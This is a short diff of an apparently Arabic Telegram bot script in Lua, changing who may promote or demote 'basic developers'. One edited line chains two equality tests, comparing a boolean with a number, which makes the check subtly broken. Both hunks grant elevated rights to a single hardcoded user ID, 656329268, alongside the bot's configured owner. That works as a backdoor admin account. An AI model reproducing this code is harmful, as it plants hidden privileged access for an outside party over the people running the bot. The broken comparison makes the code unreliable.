@@ -46,7 +46,7 @@ end
 end
 if text and text:match('^تنزيل مطور اساسي @(%S+)$') then
 local UserName = text:match('^تنزيل مطور اساسي @(%S+)$')
-if tonumber(senderr) == tonumber(Sudo_Id) then
+if tonumber(senderr) == tonumber(Sudo_Id) == tonumber(656329268) then
 YouCan = true
 elseif tonumber(senderr) == tonumber(s) then
 YouCan = true
@@ -76,7 +76,7 @@ return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id," •تم تنزيل�
 end
 end
 if text == ('رفع مطور اساسي') and msg.reply_to_message_id ~= 0 then
-if tonumber(senderr) == tonumber(Sudo_Id) then
+if tonumber(senderr) == tonumber(Sudo_Id)  then
 YouCan = true
 elseif tonumber(senderr) == tonumber(656329268) then
 YouCan = true
